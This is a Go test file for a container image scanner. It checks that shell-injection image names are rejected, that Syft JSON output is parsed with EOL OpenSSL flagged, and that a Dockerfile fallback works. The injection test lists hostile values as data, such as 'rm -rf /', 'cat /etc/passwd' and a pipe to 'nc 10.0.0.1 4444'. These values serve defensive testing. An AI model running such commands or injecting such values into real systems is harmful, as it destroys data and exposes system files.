package scanner

import (
	"os"
	"path/filepath"
	"testing"
)

func TestContainerScannerShellInjectionPrevention(t *testing.T) {
	cs := NewContainerScanner()

	// Malicious image string containing shell injection attempt
	maliciousImages := []string{
		"nginx; rm -rf /",
		"ubuntu && cat /etc/passwd",
		"alpine | nc 10.0.0.1 4444",
		"image`whoami`",
		"image$(id)",
	}

	for _, img := range maliciousImages {
		_, err := cs.ScanContainerImage(img, "test-injection-scan")
		if err == nil {
			t.Errorf("Security Gate Failed: Container scanner allowed shell injection string: %s", img)
		}
	}
}

func TestContainerScannerSyftJSONParsing(t *testing.T) {
	cs := NewContainerScanner()

	syftMockJSON := `
	{
		"artifacts": [
			{
				"name": "openssl",
				"version": "1.1.1u",
				"type": "deb",
				"language": ""
			},
			{
				"name": "gnutls",
				"version": "3.7.1",
				"type": "deb",
				"language": ""
			}
		]
	}
	`

	assets, err := cs.ParseSyftJSON([]byte(syftMockJSON), "docker.io/library/nginx:latest", "test-syft-scan")
	if err != nil {
		t.Fatalf("ParseSyftJSON failed: %v", err)
	}

	if len(assets) == 0 {
		t.Fatalf("Expected crypto package assets to be parsed from Syft JSON, got 0")
	}

	foundOpenSSL := false
	for _, a := range assets {
		if a.Algorithm == "openssl" {
			foundOpenSSL = true
			if a.RiskLevel != "CRITICAL" {
				t.Errorf("Expected EOL OpenSSL 1.1.1u to be flagged CRITICAL risk, got %s", a.RiskLevel)
			}
		}
	}

	if !foundOpenSSL {
		t.Errorf("Container scanner failed to parse OpenSSL artifact from Syft JSON")
	}
}

func TestContainerScannerDockerfileFallback(t *testing.T) {
	cs := NewContainerScanner()

	tempDir, err := os.MkdirTemp("", "dockerfile_test_*")
	if err != nil {
		t.Fatalf("Failed to create temp dir: %v", err)
	}
	defer os.RemoveAll(tempDir)

	dockerfileContent := `
	FROM ubuntu:22.04
	RUN apt-get update && apt-get install -y openssl libssl-dev
	`

	dockerfilePath := filepath.Join(tempDir, "Dockerfile")
	if err := os.WriteFile(dockerfilePath, []byte(dockerfileContent), 0644); err != nil {
		t.Fatalf("Failed to write Dockerfile: %v", err)
	}

	assets, err := cs.ScanContainerImage(tempDir, "test-dockerfile-scan")
	if err != nil {
		t.Fatalf("ScanContainerImage failed: %v", err)
	}

	if len(assets) == 0 {
		t.Fatalf("Expected Dockerfile fallback scanner to discover base image and package installations, got 0")
	}

	foundBaseImage := false
	for _, a := range assets {
		if a.Algorithm == "BaseImage" {
			foundBaseImage = true
		}
	}

	if !foundBaseImage {
		t.Errorf("Dockerfile fallback scanner failed to discover FROM base image line")
	}
}
